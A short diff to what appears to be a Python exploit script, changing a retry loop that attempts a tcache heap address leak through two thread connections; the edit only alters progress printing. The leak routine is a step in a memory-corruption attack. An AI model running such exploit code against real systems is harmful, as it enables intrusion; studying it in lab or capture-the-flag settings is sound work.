@@ -207,14 +207,15 @@ def tcache_leak(thd1: thread_comm, thd2: thread_comm):
 
 
 def get_tcache_leak(thd1, thd2):
-    for _ in range(TRIES):
+    for i in range(TRIES):
         tcache_addr = tcache_leak(thd1, thd2)
         if tcache_addr:
-            print("Tcache leak:", hex(tcache_addr))
+            print("\nTcache leak:", hex(tcache_addr))
             thd1.tcache_leak = tcache_addr
             return tcache_addr
 
-        print("... ", end='')
+        if not i % 500:
+            print("... ", end='')
 
     raise ValueError("No tcache leak")
 
